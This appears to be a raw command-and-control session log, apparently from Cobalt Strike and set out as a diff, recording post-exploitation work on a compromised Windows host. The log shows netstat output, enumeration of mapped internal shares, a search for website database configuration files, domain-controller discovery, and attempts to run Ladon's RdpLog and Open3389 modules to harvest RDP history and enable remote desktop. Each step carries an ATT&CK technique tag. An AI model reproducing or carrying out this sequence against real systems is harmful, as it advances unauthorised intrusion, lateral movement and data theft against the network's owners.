+  TCP    [::]:49670             [::]:0                 LISTENING       904
+  TCP    [::]:55368             [::]:0                 LISTENING       19624
+  TCP    [::1]:43958            [::]:0                 LISTENING       3648
+  TCP    [::1]:49669            [::]:0                 LISTENING       4240
+  TCP    [fe80::7c7f:4fcf:145c:4df0%3]:64237  [fe80::1303:1767:18c3:9616%3]:445  ESTABLISHED     4
+  UDP    0.0.0.0:500            *:*                                    3464
+  UDP    0.0.0.0:3702           *:*                                    3356
+  UDP    0.0.0.0:3702           *:*                                    3356
+  UDP    0.0.0.0:3702           *:*                                    4032
+  UDP    0.0.0.0:3702           *:*                                    4032
+  UDP    0.0.0.0:4026           *:*                                    7908
+  UDP    0.0.0.0:4500           *:*                                    3464
+  UDP    0.0.0.0:5050           *:*                                    7076
+  UDP    0.0.0.0:5353           *:*                                    2708
+  UDP    0.0.0.0:5353           *:*                                    20496
+  UDP    0.0.0.0:5353           *:*                                    6704
+  UDP    0.0.0.0:5353           *:*                                    6704
+  UDP    0.0.0.0:5353           *:*                                    15552
+  UDP    0.0.0.0:5353           *:*                                    15552
+  UDP    0.0.0.0:5353           *:*                                    20496
+  UDP    0.0.0.0:5355           *:*                                    2708
+  UDP    0.0.0.0:10335          *:*                                    3864
+  UDP    0.0.0.0:10336          *:*                                    3864
+  UDP    0.0.0.0:49366          *:*                                    4032
+  UDP    0.0.0.0:52854          *:*                                    3696
+  UDP    0.0.0.0:54472          *:*                                    7908
+  UDP    0.0.0.0:56293          *:*                                    3696
+  UDP    0.0.0.0:61047          *:*                                    6704
+  UDP    0.0.0.0:61048          *:*                                    6704
+  UDP    0.0.0.0:63495          *:*                                    3356
+  UDP    127.0.0.1:1900         *:*                                    4408
+  UDP    127.0.0.1:51594        *:*                                    7908
+  UDP    127.0.0.1:51595        *:*                                    7908
+  UDP    127.0.0.1:56287        *:*                                    4072
+  UDP    127.0.0.1:58154        *:*                                    7908
+  UDP    127.0.0.1:58155        *:*                                    7908
+  UDP    127.0.0.1:58156        *:*                                    7908
+  UDP    127.0.0.1:58157        *:*                                    7908
+  UDP    127.0.0.1:58158        *:*                                    7908
+  UDP    127.0.0.1:58159        *:*                                    7908
+  UDP    127.0.0.1:62040        *:*                                    4408
+  UDP    127.0.0.1:64207        *:*                                    7908
+  UDP    127.0.0.1:64208        *:*                                    7908
+  UDP    127.0.0.1:64209        *:*                                    7908
+  UDP    127.0.0.1:64210        *:*                                    7908
+  UDP    192.168.110.29:137     *:*                                    4
+  UDP    192.168.110.29:138     *:*                                    4
+  UDP    192.168.110.29:1900    *:*                                    4408
+  UDP    192.168.110.29:2177    *:*                                    2336
+  UDP    192.168.110.29:62039   *:*                                    4408
+  UDP    [::]:500               *:*                                    3464
+  UDP    [::]:3702              *:*                                    3356
+  UDP    [::]:3702              *:*                                    3356
+  UDP    [::]:3702              *:*                                    4032
+  UDP    [::]:3702              *:*                                    4032
+  UDP    [::]:4500              *:*                                    3464
+  UDP    [::]:5353              *:*                                    20496
+  UDP    [::]:5353              *:*                                    6704
+  UDP    [::]:5353              *:*                                    15552
+  UDP    [::]:5353              *:*                                    2708
+  UDP    [::]:5355              *:*                                    2708
+  UDP    [::]:49367             *:*                                    4032
+  UDP    [::]:61048             *:*                                    6704
+  UDP    [::]:63496             *:*                                    3356
+  UDP    [::1]:1900             *:*                                    4408
+  UDP    [::1]:62038            *:*                                    4408
+  UDP    [fe80::7c7f:4fcf:145c:4df0%3]:1900  *:*                                    4408
+  UDP    [fe80::7c7f:4fcf:145c:4df0%3]:2177  *:*                                    2336
+  UDP    [fe80::7c7f:4fcf:145c:4df0%3]:62037  *:*                                    4408
+
+
+10/07 07:24:47 UTC [output]
+9========== 查看连接(本机连接其他机器) ==========
+
+10/07 07:24:47 UTC [task] <T1059> Tasked beacon to run: net use
+10/07 07:24:47 UTC [checkin] host called home, sent: 59 bytes
+10/07 07:24:47 UTC [output]
+received output:
+会记录新的网络连接。
+
+
+状态       本地        远程                      网络
+
+-------------------------------------------------------------------------------
+不可用       Y:        \\192.168.110.246\造价部  Microsoft Windows Network
+不可用       Z:        \\192.168.110.246\DAta    Microsoft Windows Network
+命令成功完成。
+
+
+
+10/07 07:25:09 UTC [output]
+9=========== 查找网站数据库配置文件 ==========
+
+10/07 07:25:09 UTC [task] <T1059> Tasked beacon to run: dir / a / s / b "@('1900965024') * config *"
+10/07 07:25:10 UTC [checkin] host called home, sent: 75 bytes
+10/07 07:25:10 UTC [output]
+received output:
+找不到文件
+
+
+10/07 07:25:33 UTC [input] <neo> net time
+10/07 07:25:33 UTC [task] <T1124, T1093> Tasked beacon to run net time on localhost
+10/07 07:25:33 UTC [checkin] host called home, sent: 105057 bytes
+10/07 07:25:35 UTC [output]
+received output:
+Current time at \\localhost is 10/7/2023 15:25:33
+
+
+10/07 07:25:37 UTC [input] <neo> net time /domain
+10/07 07:25:37 UTC [error] net error: argument '/domain' is not a \\target
+10/07 07:25:41 UTC [input] <neo> shell net time /domain
+10/07 07:25:41 UTC [task] <T1059> Tasked beacon to run: net time /domain
+10/07 07:25:42 UTC [checkin] host called home, sent: 47 bytes
+10/07 07:25:42 UTC [output]
+received output:
+找不到域 WorkGroup 的域控制器。
+
+请键入 NET HELPMSG 3913 以获得更多的帮助。
+
+
+
+10/07 07:25:59 UTC [output]
+Ladon RdpLog
+
+10/07 07:26:05 UTC [error] Task size of 1050167 bytes is over the max task size limit of 1048576 bytes.
+10/07 07:26:57 UTC [output]
+Ladon Open3389
+
+10/07 07:27:03 UTC [error] Task size of 1050171 bytes is over the max task size limit of 1048576 bytes.
